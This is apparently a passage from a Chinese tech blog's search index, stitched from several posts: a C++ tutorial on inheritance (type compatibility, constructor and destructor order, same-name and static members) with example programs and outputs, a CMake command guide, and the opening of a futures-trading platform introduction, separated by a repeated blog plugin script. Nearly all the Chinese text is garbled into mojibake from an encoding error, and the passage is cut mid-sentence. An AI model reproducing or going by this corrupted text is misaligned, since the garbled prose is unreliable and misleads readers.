çœ‹å­ç±»å¦‚ä½•ä»çˆ¶ç±»ç»§æ‰¿ï¼ˆpublicã€privateã€protectedï¼‰ c) çœ‹çˆ¶ç±»ä¸­çš„è®¿é—®çº§åˆ«ï¼ˆpublicã€privateã€protectedï¼‰ æ´¾ç”Ÿç±»æˆå‘˜è®¿é—®çº§åˆ«æ§åˆ¶çš„åŸåˆ™å¯¹äºæ´¾ç”Ÿç±»è‡ªèº«çš„æˆå‘˜ï¼Œè®¿é—®çº§åˆ«æ§åˆ¶çš„åŸåˆ™å¦‚ä¸‹ï¼š a) éœ€è¦è¢«å¤–ç•Œè®¿é—®çš„æˆå‘˜ç›´æ¥è®¾ç½®ä¸º public b) åªèƒ½åœ¨å½“å‰ç±»ä¸­è®¿é—®çš„æˆå‘˜è®¾ç½®ä¸º private c) åªèƒ½åœ¨å½“å‰ç±»å’Œå­ç±»ä¸­è®¿é—®çš„æˆå‘˜è®¾ç½®ä¸º protected ç»§æ‰¿ä¸­çš„æ„é€ å’Œææ„ç±»å‹å…¼å®¹åŸåˆ™ç±»å‹å…¼å®¹è§„åˆ™æ˜¯æŒ‡åœ¨éœ€è¦åŸºç±»å¯¹è±¡çš„ä»»ä½•åœ°æ–¹ï¼Œéƒ½å¯ä»¥ä½¿ç”¨å…¬æœ‰æ´¾ç”Ÿç±»ï¼ˆå…¬æœ‰ç»§æ‰¿ï¼‰çš„å¯¹è±¡æ¥æ›¿ä»£ã€‚é€šè¿‡å…¬æœ‰ç»§æ‰¿ï¼Œæ´¾ç”Ÿç±»å¾—åˆ°äº†åŸºç±»ä¸­é™¤æ„é€ å‡½æ•°ã€ææ„å‡½æ•°ä¹‹å¤–çš„æ‰€æœ‰æˆå‘˜ã€‚è¿™æ ·ï¼Œå…¬æœ‰æ´¾ç”Ÿç±»å®é™…å°±å…·å¤‡äº†åŸºç±»çš„æ‰€æœ‰åŠŸèƒ½ï¼Œå‡¡æ˜¯åŸºç±»èƒ½è§£å†³çš„é—®é¢˜ï¼Œå…¬æœ‰æ´¾ç”Ÿç±»éƒ½å¯ä»¥è§£å†³ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨æ›¿ä»£ä¹‹åï¼Œæ´¾ç”Ÿç±»å¯¹è±¡å°±å¯ä»¥ä½œä¸ºåŸºç±»çš„å¯¹è±¡ä½¿ç”¨ï¼Œä½†æ˜¯åªèƒ½ä½¿ç”¨ä»åŸºç±»ç»§æ‰¿å¾—åˆ°çš„æˆå‘˜ï¼Œç±»å‹å…¼å®¹è§„åˆ™æ˜¯å¤šæ€æ€§çš„é‡è¦åŸºç¡€ä¹‹ä¸€ã€‚ç±»å‹å…¼å®¹è§„åˆ™ä¸­æ‰€æŒ‡çš„æ›¿ä»£åŒ…æ‹¬ä»¥ä¸‹æƒ…å†µï¼š å­ç±»å¯¹è±¡å¯ä»¥å½“ä½œçˆ¶ç±»å¯¹è±¡ä½¿ç”¨ å­ç±»å¯¹è±¡å¯ä»¥ç›´æ¥èµ‹å€¼ç»™çˆ¶ç±»å¯¹è±¡ å­ç±»å¯¹è±¡å¯ä»¥ç›´æ¥åˆå§‹åŒ–çˆ¶ç±»å¯¹è±¡ çˆ¶ç±»æŒ‡é’ˆå¯ä»¥ç›´æ¥æŒ‡å‘å­ç±»å¯¹è±¡ çˆ¶ç±»å¼•ç”¨å¯ä»¥ç›´æ¥å¼•ç”¨å­ç±»å¯¹è±¡ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;iostream&gt;using namespace std;// çˆ¶ç±»class Parent {public: void printParent() { cout &lt;&lt; "I\'m parent" &lt;&lt; endl; }private: int a;};// å­ç±»ï¼ˆå…¬æœ‰ç»§æ‰¿ï¼‰class Child : public Parent {public: void printChild() { cout &lt;&lt; "I\'m child" &lt;&lt; endl; }private: int c;};void howToPrint(Parent* p) { p-&gt;printParent();}void howToPrint(Parent&amp; p) { p.printParent();}int main() { Parent p1; p1.printParent(); Child c1; c1.printChild(); c1.printParent(); // 1-1 çˆ¶ç±»æŒ‡é’ˆå¯ä»¥ç›´æ¥æŒ‡å‘å­ç±»å¯¹è±¡ cout &lt;&lt; "1-1" &lt;&lt; endl; Parent* p2 = NULL; p2 = &amp;c1; p2-&gt;printParent(); // 1-2 çˆ¶ç±»æŒ‡é’ˆå¯ä»¥ç›´æ¥æŒ‡å‘å­ç±»å¯¹è±¡ï¼ŒæŒ‡é’ˆåšå‡½æ•°å‚æ•° cout &lt;&lt; "1-2" &lt;&lt; endl; howToPrint(&amp;p1); howToPrint(&amp;c1); // 2-1 çˆ¶ç±»å¼•ç”¨å¯ä»¥ç›´æ¥å¼•ç”¨å­ç±»å¯¹è±¡ cout &lt;&lt; "2-1" &lt;&lt; endl; Parent&amp; p3 = c1; p3.printParent(); // 2-2 çˆ¶ç±»å¼•ç”¨å¯ä»¥ç›´æ¥å¼•ç”¨å­ç±»å¯¹è±¡ï¼Œå¼•ç”¨åšå‡½æ•°å‚æ•° cout &lt;&lt; "2-2" &lt;&lt; endl; howToPrint(p1); howToPrint(c1); // 3-1 å­ç±»å¯¹è±¡å¯ä»¥ç›´æ¥åˆå§‹åŒ–çˆ¶ç±»å¯¹è±¡ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨çˆ¶ç±»çš„æ‹·è´æ„é€ å‡½æ•° cout &lt;&lt; "3-1" &lt;&lt; endl; Parent p4 = c1; p4.printParent(); // 4-1 å­ç±»å¯¹è±¡å¯ä»¥ç›´æ¥èµ‹å€¼ç»™çˆ¶ç±»å¯¹è±¡ cout &lt;&lt; "4-1" &lt;&lt; endl; Parent p5; p5 = c1; p5.printParent(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234567891011121314151617I\'m parentI\'m childI\'m parent1-1I\'m parent1-2I\'m parentI\'m parent2-1I\'m parent2-2I\'m parentI\'m parent3-1I\'m parent4-1I\'m parent ç»§æ‰¿ä¸­çš„å¯¹è±¡æ¨¡å‹ç±»åœ¨ C++ ç¼–è¯‘å™¨çš„å†…éƒ¨å¯ä»¥ç†è§£ä¸ºç»“æ„ä½“ï¼Œå­ç±»æ˜¯ç”±çˆ¶ç±»æˆå‘˜å åŠ å­ç±»æ–°æˆå‘˜å¾—åˆ°çš„ã€‚ çˆ¶ç±»ä¸å­ç±»çš„æ„é€ å‡½æ•°ã€ææ„å‡½æ•°çš„å…³ç³»å¦‚ä¸‹ï¼š åœ¨å­ç±»å¯¹è±¡æ„é€ æ—¶ï¼Œéœ€è¦è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°å¯¹å…¶ç»§æ‰¿å¾—æ¥çš„æˆå‘˜è¿›è¡Œåˆå§‹åŒ– åœ¨å­ç±»å¯¹è±¡ææ„æ—¶ï¼Œéœ€è¦è°ƒç”¨çˆ¶ç±»ææ„å‡½æ•°å¯¹å…¶ç»§æ‰¿å¾—æ¥çš„æˆå‘˜è¿›è¡Œæ¸…ç† ç»§æ‰¿ä¸­çš„æ„é€ ä¸ææ„çš„è°ƒç”¨åŸåˆ™ a) å­ç±»å¯¹è±¡åœ¨åˆ›å»ºæ—¶ï¼Œä¼šé¦–å…ˆè°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•° b) çˆ¶ç±»æ„é€ å‡½æ•°æ‰§è¡Œç»“æŸåï¼Œå†æ‰§è¡Œå­ç±»çš„æ„é€ å‡½æ•° c) å½“çˆ¶ç±»åªå­˜åœ¨æœ‰å‚æ„é€ å‡½æ•°æ—¶ï¼Œå¿…é¡»åœ¨å­ç±»çš„åˆå§‹åŒ–åˆ—è¡¨ä¸­æ˜¾ç¤ºè°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•° d) ææ„å‡½æ•°è°ƒç”¨çš„å…ˆåé¡ºåºä¸æ„é€ å‡½æ•°ç›¸åï¼Œå³å…ˆè°ƒç”¨å­ç±»çš„ææ„å‡½æ•°ï¼Œå†è°ƒç”¨çˆ¶ç±»çš„ææ„å‡½æ•° 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a, int b) { this-&gt;a = a; this-&gt;b = b; cout &lt;&lt; "çˆ¶ç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } ~Parent() { cout &lt;&lt; "çˆ¶ç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } void printParent() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; endl; }private: int a; int b;};class Child : public Parent {public: // å½“çˆ¶ç±»åªå­˜åœ¨æœ‰å‚æ„é€ å‡½æ•°æ—¶ï¼Œå¿…é¡»åœ¨å­ç±»çš„åˆå§‹åŒ–åˆ—è¡¨ä¸­æ˜¾ç¤ºè°ƒç”¨ Child(int a, int b, int c) : Parent(a, b) { this-&gt;c = c; cout &lt;&lt; "å­ç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } ~Child() { cout &lt;&lt; "å­ç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } void printChild() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; this-&gt;c &lt;&lt; endl; }private: int c;};int main() { Child c1(1, 2, 3); c1.printParent(); c1.printChild(); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 123456çˆ¶ç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨å­ç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨I\'m parent, a = 1, b = 2I\'m child, c = 3å­ç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨çˆ¶ç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨ ç»§æ‰¿ä¸ç»„åˆæ··æ­æƒ…å†µä¸‹ï¼Œæ„é€ å’Œææ„çš„è°ƒç”¨åŸåˆ™ç»§æ‰¿ä¸ç»„åˆå¯¹è±¡æ··æ­ä½¿ç”¨çš„æƒ…å†µä¸‹ï¼Œæ„é€ å‡½æ•°ä¸ææ„å‡½æ•°çš„è°ƒç”¨åŸåˆ™å¦‚ä¸‹ï¼š æ„é€ å‡½æ•°çš„è°ƒç”¨ï¼šå…ˆæ„é€ çˆ¶ç±»ï¼Œå†æ„é€ æˆå‘˜å˜é‡ï¼Œæœ€åæ„é€ è‡ªèº« ææ„å‡½æ•°çš„è°ƒç”¨ï¼šå…ˆææ„è‡ªèº«ï¼Œå†ææ„æˆå‘˜å˜é‡ï¼Œæœ€åææ„çˆ¶ç±» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;iostream&gt;using namespace std;class Object {public: Object(int a, int b) { this-&gt;a = a; this-&gt;b = b; cout &lt;&lt; "Objectç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } ~Object() { cout &lt;&lt; "Objectç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } void printObject() { cout &lt;&lt; "I\'m object, a = " &lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; endl; }protected: int a; int b;};class Parent : public Object {public: // é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨ï¼Œè°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•° Parent(char* p) : Object(1, 2) { this-&gt;p = p; cout &lt;&lt; "Parentç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } ~Parent() { cout &lt;&lt; "Parentç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } void printParent() { cout &lt;&lt; "I\'m parent, p = " &lt;&lt; p &lt;&lt; endl; }protected: char* p;};class Child : public Parent {public: // é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨ï¼Œè°ƒç”¨ç»„åˆå¯¹è±¡ä¸çˆ¶ç±»çš„æ„é€ å‡½æ•° Child(char* c) : obj1(3, 4), obj2(5, 6), Parent(c) { this-&gt;c = c; cout &lt;&lt; "Childç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } ~Child() { cout &lt;&lt; "Childç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } void printChild() { cout &lt;&lt; "I\'m child, p = " &lt;&lt; p &lt;&lt; endl; }protected: char* c; // ç»„åˆå¯¹è±¡ Object obj1; Object obj2;};int main() { char* str = new char[3]; str[0] = \'J\'; str[1] = \'i\'; str[2] = \'m\'; Child c1(str); c1.printChild(); c1.printParent(); c1.printObject(); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12345678910111213Objectç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨Parentç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨Objectç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨Objectç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨Childç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨I\'m child, p = JimI\'m parent, p = JimI\'m object, a = 1, b = 2Childç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨Objectç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨Objectç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨Parentç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨Objectç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨ ç»§æ‰¿ä¸­çš„åŒåæˆå‘˜çš„å¤„ç†æ–¹å¼ å½“å­ç±»æˆå‘˜ä¸çˆ¶ç±»æˆå‘˜åŒåæ—¶ï¼Œå­ç±»ä¾ç„¶å¯ä»¥ä»çˆ¶ç±»ç»§æ‰¿åŒåæˆå‘˜ åœ¨å­ç±»ä¸­é€šè¿‡ä½œç”¨åŸŸåˆ†è¾¨ç¬¦ :: è¿›è¡ŒåŒåæˆå‘˜çš„åŒºåˆ†ï¼ˆåœ¨å­ç±»ä¸­ä½¿ç”¨çˆ¶ç±»çš„åŒåæˆå‘˜ï¼Œéœ€è¦æ˜¾å¼åœ°ä½¿ç”¨ç±»åé™å®šç¬¦ï¼‰ï¼Œå…¶ä½œç”¨ç±»ä¼¼ Java ä¸­çš„ super å…³é”®å­— åŒåæˆå‘˜å­˜å‚¨åœ¨å†…å­˜ä¸­çš„ä¸åŒä½ç½® 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a, int b) { this-&gt;a = a; this-&gt;b = b; } void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; }public: int a; int b;};class Child : public Parent {public: Child(int a, int b) : Parent(a, b) { this-&gt;a = a + 5; this-&gt;b = b + 5; } void print() { cout &lt;&lt; "I\'m child, a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; }public: int a; int b;};int main() { Child child(1, 2); // å­ç±»è®¿é—®è‡ªèº«çš„åŒåæˆå‘˜å‡½æ•° child.print(); // å­ç±»è®¿é—®è‡ªèº«çš„åŒåæˆå‘˜å˜é‡ cout &lt;&lt; "child\'s a = " &lt;&lt; child.a &lt;&lt; endl; cout &lt;&lt; "child\'s b = " &lt;&lt; child.b &lt;&lt; endl; // å­ç±»è®¿é—®çˆ¶ç±»çš„åŒåæˆå‘˜å‡½æ•° child.Parent::print(); // å­ç±»è®¿é—®çˆ¶ç±»çš„åŒåæˆå‘˜å˜é‡ cout &lt;&lt; "parent\'s a = " &lt;&lt; child.Parent::a &lt;&lt; endl; cout &lt;&lt; "parent\'s b = " &lt;&lt; child.Parent::b &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 123456I\'m child, a = 6, b = 7child\'s a = 6child\'s b = 7I\'m parent, a = 1, b = 2parent\'s a = 1parent\'s b = 2 æ´¾ç”Ÿç±»ä¸­çš„ static å…³é”®å­—ä½¿ç”¨åœ¨ C++ çš„æ™®é€šç±»ä¸­ï¼Œstatic å…³é”®å­—çš„ä½¿ç”¨å¯ä»¥çœ‹ è¿™é‡Œï¼Œè€Œæ´¾ç”Ÿç±»ä¸­ static å…³é”®å­—çš„ä½¿ç”¨è¯´æ˜å¦‚ä¸‹ï¼š åŸºç±»å®šä¹‰çš„é™æ€æˆå‘˜ï¼Œå°†è¢«æ‰€æœ‰æ´¾ç”Ÿç±»å…±äº« æ ¹æ®é™æ€æˆå‘˜è‡ªèº«çš„è®¿é—®ç‰¹æ€§å’Œæ´¾ç”Ÿç±»çš„ç»§æ‰¿æ–¹å¼ï¼Œåœ¨ç±»å±‚æ¬¡ä½“ç³»ä¸­å…·æœ‰ä¸åŒçš„è®¿é—®æ€§è´¨ï¼ˆéµå®ˆæ´¾ç”Ÿç±»æˆå‘˜è®¿é—®çº§åˆ«æ§åˆ¶çš„åŸåˆ™ï¼‰ åœ¨æ´¾ç”Ÿç±»ä¸­è®¿é—®åŸºç±»çš„é™æ€æˆå‘˜ï¼Œéœ€è¦æ˜¾å¼è¯´æ˜ï¼Œå¯¹åº”çš„è¯­æ³•æ˜¯ï¼šç±»å :: æˆå‘˜ æˆ–è€…é€šè¿‡å¯¹è±¡è®¿é—®ï¼šå¯¹è±¡å . æˆå‘˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;iostream&gt;using namespace std;class Parent {public: // å£°æ˜å…¬æœ‰çš„é™æ€æˆå‘˜å‡½æ•° static void print() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; }public: // å£°æ˜å…¬æœ‰çš„é™æ€æˆå‘˜å˜é‡ static int a;private: // å£°æ˜ç§æœ‰çš„é™æ€æˆå‘˜å˜é‡ static int b;};// å®šä¹‰ç§æœ‰çš„é™æ€æˆå‘˜å˜é‡int Parent::b = 50;// å®šä¹‰å…¬æœ‰çš„é™æ€æˆå‘˜å˜é‡ï¼Œè¿™é‡Œä¸æ˜¯ç®€å•çš„å˜é‡èµ‹å€¼ï¼Œæ›´é‡è¦çš„æ˜¯å‘Šè¯‰C++ç¼–è¯‘å™¨ï¼Œç»™é™æ€æˆå‘˜å˜é‡åˆ†é…å†…å­˜, å¦åˆ™åœ¨æ´¾ç”Ÿç±»ä¸­ç”¨åˆ°è¯¥å˜é‡å°±ä¼šæŠ¥é”™int Parent::a = 30;class Child : public Parent {public: int getA() { // è®¿é—®ä»åŸºç±»ç»§æ‰¿å¾—åˆ°çš„é™æ€æˆå‘˜å˜é‡ return this-&gt;a; } int getA2() { // è®¿é—®åŸºç±»çš„é™æ€æˆå‘˜å˜é‡ return Parent::a; } int getB() { // return b; é”™è¯¯å†™æ³•ï¼ŒåŸºç±»ä¸­é™æ€æˆå‘˜è‡ªèº«çš„è®¿é—®ç‰¹æ€§éµå®ˆæ´¾ç”Ÿç±»çš„è®¿é—®çº§åˆ«æ§åˆ¶åŸåˆ™ï¼Œå› æ­¤è¿™é‡Œä¸èƒ½è®¿é—®åŸºç±»ä¸­ç§æœ‰çš„é™æ€æˆå‘˜å˜é‡b return 0; } // è°ƒç”¨ä»åŸºç±»ç»§æ‰¿å¾—åˆ°çš„é™æ€æˆå‘˜å‡½æ•° void print2() { this-&gt;print(); } // è°ƒç”¨åŸºç±»çš„é™æ€æˆå‘˜å‡½æ•° void print1() { Parent::print(); }};int main() { // åœ¨ç±»å¤–è®¿é—®åŸºç±»çš„é™æ€æˆå‘˜å˜é‡å’Œé™æ€æˆå‘˜å‡½æ•° Parent::a++; Parent::print(); cout &lt;&lt; endl; // åœ¨ç±»å¤–è®¿é—®æ´¾ç”Ÿç±»çš„é™æ€æˆå‘˜å˜é‡å’Œé™æ€æˆå‘˜å‡½æ•° cout &lt;&lt; "a = " &lt;&lt; Child::a &lt;&lt; endl; Child::print(); cout &lt;&lt; endl; Child c1; cout &lt;&lt; "a = " &lt;&lt; c1.getA() &lt;&lt; endl; cout &lt;&lt; "a = " &lt;&lt; c1.getA2() &lt;&lt; endl; cout &lt;&lt; "a = " &lt;&lt; c1.Parent::a &lt;&lt; endl; cout &lt;&lt; endl; c1.print1(); c1.print2(); c1.Parent::print(); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 123456789101112a = 31, b = 50a = 31a = 31, b = 50a = 31a = 31a = 31a = 31, b = 50a = 31, b = 50a = 31, b = 50 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"CMake å…¥é—¨æ•™ç¨‹ä¹‹äºŒå¸¸ç”¨å‘½ä»¤",url:"/posts/881a3bba.html",text:'æŸ¥æ‰¾æ–‡ä»¶æŸ¥æ‰¾æºæ–‡ä»¶12345678# æŸ¥æ‰¾ src ç›®å½•ä¸‹çš„æ‰€æœ‰æºæ–‡ä»¶ï¼Œå¹¶ä¿å­˜åˆ° SOURCE_FILES å˜é‡aux_source_directory(src SOURCE_FILES)# æŸ¥æ‰¾ src ç›®å½•ä¸‹æ‰€æœ‰ä»¥ .cpp å¼€å¤´çš„æ–‡ä»¶ï¼Œå¹¶ä¿å­˜åˆ° SOURCE_FILES å˜é‡file(GLOB SOURCE_FILES "src/*.cpp")# é€’å½’æŸ¥æ‰¾ src ç›®å½•ä¸‹æ‰€æœ‰ä»¥ .cpp å¼€å¤´çš„æ–‡ä»¶ï¼Œå¹¶ä¿å­˜åˆ° SOURCE_FILES å˜é‡file(GLOB_RECURSE SOURCE_FILES "src/*.cpp") æ’é™¤æŒ‡å®šçš„æ–‡ä»¶12345# æŸ¥æ‰¾ src ç›®å½•ä¸‹æ‰€æœ‰ä»¥ .cpp å¼€å¤´çš„æ–‡ä»¶ï¼Œå¹¶ä¿å­˜åˆ° SOURCE_FILES å˜é‡file(GLOB SOURCE_FILES "src/*.cpp")# æ’é™¤ example.cpp æºæ–‡ä»¶list(FILTER SOURCE_FILES EXCLUDE REGEX "example.cpp") è¾“å‡ºç›®å½•æŒ‡å®šè¾“å‡ºç›®å½•12345# æŒ‡å®šæ„å»ºè¾“å‡ºçš„ç›®å½•ï¼ˆbuild ç›®å½•ï¼‰set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# æŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„è¾“å‡ºç›®å½•ï¼ˆbin ç›®å½•ï¼‰set(EXECUTABLE_OUTPUT_PATH ${PROJECT_SOURCE_DIR}/bin) ç¼–è¯‘ä»£ç è®¾ç½®ç¼–è¯‘å‚æ•°1234567set(CMAKE_CXX_COMPILER "clang++") # æŒ‡å®šä½¿ç”¨çš„ C++ ç¼–è¯‘å™¨set(CMAKE_CXX_FLAGS "-std=c++11") # æŒ‡å®šä½¿ç”¨çš„ C++ çš„ç‰ˆæœ¬set(CMAKE_CXX_FLAGS "-g") # è¾“å‡ºè°ƒè¯•ä¿¡æ¯set(CMAKE_CXX_FLAGS "-Wall") # å¼€å¯æ‰€æœ‰è­¦å‘Šset(CMAKE_CXX_FLAGS_DEBUG "-O0") # è°ƒè¯•åŒ…ä¸ä¼˜åŒ–set(CMAKE_CXX_FLAGS_RELEASE "-O2 -DNDEBUG") # å‘å¸ƒåŒ…ä¼˜åŒ–set(CMAKE_CXX_FLAGS "-lpthread") # é“¾æ¥ pthread åº“ è®¾ç½®é¢„å¤„ç†æŒ‡ä»¤1234567891011121314#include &lt;iostream&gt;using namespace std;int main() {#ifdef TARGET cout &lt;&lt; "Hello!" &lt;&lt; endl;#else cout &lt;&lt; "World!" &lt;&lt; endl;#endif return 0;} CMake æŒ‡å®šç¼–è¯‘å‚æ•° 1set(CMAKE_CXX_FLAGS "-DTARGET") è°ƒè¯•ä¿¡æ¯æ‰“å°æ—¥å¿—ä¿¡æ¯æç¤º ä½¿ç”¨ MESSAGE() æŒ‡ä»¤å¯ä»¥è¾“å‡ºæŒ‡å®šçš„æ—¥å¿—ä¿¡æ¯ï¼Œä¾‹å¦‚æ‰“å° CMake å˜é‡çš„å€¼ 123456# æŸ¥æ‰¾ GoogleTest åº“FIND_PACKAGE(GTest REQUIRED)# æ˜¾ç¤º GoogleTest åº“çš„è·¯å¾„MESSAGE(STATUS "GTEST_INCLUDE_DIRS : " ${GTEST_INCLUDE_DIRS})MESSAGE(STATUS "GTEST_BOTH_LIBRARIES : " ${GTEST_BOTH_LIBRARIES}) é“¾æ¥ç¬¬ä¸‰æ–¹åº“æŸ¥æ‰¾å¹¶é“¾æ¥ç³»ç»Ÿçš„ç¬¬ä¸‰æ–¹åº“è¿™é‡Œä»¥ç¬¬ä¸‰æ–¹åº“ GoogleTest ä¸ºä¾‹å­ï¼Œå…¶ä¸­ GoogleTest æ˜¯æ‰‹åŠ¨å®‰è£…åˆ° Linux ç³»ç»Ÿä¸Šçš„ï¼ˆç¼–è¯‘å®‰è£…æˆ–è€…é€šè¿‡åŒ…ç®¡ç†å™¨å®‰è£…ï¼‰ã€‚ 123456789# æŸ¥æ‰¾ GoogleTest åº“find_package(GTest REQUIRED)# æ˜¾ç¤º GoogleTest åº“çš„è·¯å¾„MESSAGE(STATUS "GTEST_INCLUDE_DIRS : " ${GTEST_INCLUDE_DIRS})MESSAGE(STATUS "GTEST_BOTH_LIBRARIES : " ${GTEST_BOTH_LIBRARIES})# é“¾æ¥ GoogleTest åº“target_link_libraries(${PROJECT_NAME} ${GTEST_BOTH_LIBRARIES}) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ linuxç³»ç»Ÿç¼–ç¨‹ cè¯­è¨€"},{title:"CTP ç¨‹åºåŒ–äº¤æ˜“åŸºç¡€ä¹‹ä¸€",url:"/posts/d35e15f1.html",text:'CTP ä»‹ç»CTP ç®€ä»‹ç»¼åˆäº¤æ˜“å¹³å°ï¼ˆComprehensive Transaction Platformï¼ŒCTPï¼‰æ˜¯ä¸“é—¨ä¸ºæœŸè´§å…¬å¸å¼€å‘çš„ä¸€å¥—æœŸè´§ç»çºªä¸šåŠ¡ç®¡ç†ç³»ç»Ÿï¼Œç”±äº¤æ˜“ã€é£é™©æ§åˆ¶å’Œç»“ç®—ä¸‰å¤§ç³»ç»Ÿç»„æˆã€‚å…¶ä¸­ï¼Œäº¤æ˜“ç³»ç»Ÿä¸»è¦è´Ÿè´£è®¢å•å¤„ç†ã€è¡Œæƒ…è½¬å‘åŠé“¶æœŸè½¬è´¦ä¸šåŠ¡ï¼Œç»“ç®—ç³»ç»Ÿè´Ÿè´£äº¤æ˜“ç®¡ç†ã€å¸æˆ·ç®¡ç†ã€ç»çºªäººç®¡ç†ã€èµ„é‡‘ç®¡ç†ã€è´¹ç‡è®¾ç½®ã€æ—¥ç»ˆç»“ç®—ã€ä¿¡æ¯æŸ¥è¯¢ä»¥åŠæŠ¥è¡¨ç®¡ç†ç­‰ï¼Œé£æ§ç³»ç»Ÿåˆ™ä¸»è¦åœ¨ç›˜ä¸­è¿›è¡Œé«˜é€Ÿçš„å®æ—¶è¯•ç®—ï¼Œä»¥åŠæ—¶æ­ç¤ºå¹¶æ§åˆ¶é£é™©ã€‚ç³»ç»Ÿèƒ½å¤ŸåŒæ—¶è¿é€šå›½å†…å››å®¶æœŸè´§äº¤æ˜“æ‰€ï¼Œæ”¯æŒå›½å†…å•†å“æœŸè´§å’Œè‚¡æŒ‡æœŸè´§çš„äº¤æ˜“ç»“ç®—ä¸šåŠ¡ï¼Œå¹¶èƒ½è‡ªåŠ¨ç”Ÿæˆã€æŠ¥é€ä¿è¯é‡‘ç›‘æ§æ–‡ä»¶å’Œåæ´—é’±ç›‘æ§æ–‡ä»¶ã€‚ CTP æ¶æ„ç»¼åˆäº¤æ˜“å¹³å°æ˜¯åŸºäºå…¨å†…å­˜çš„äº¤æ˜“ç³»ç»Ÿï¼Œé‡‡ç”¨åˆ›æ–°çš„å®Œå…¨ç²¾ç¡®é‡æ¼”çš„åˆ†å¸ƒå¼ä½“ç³»æ¶æ„ï¼Œæ”¯æŒ 7x24 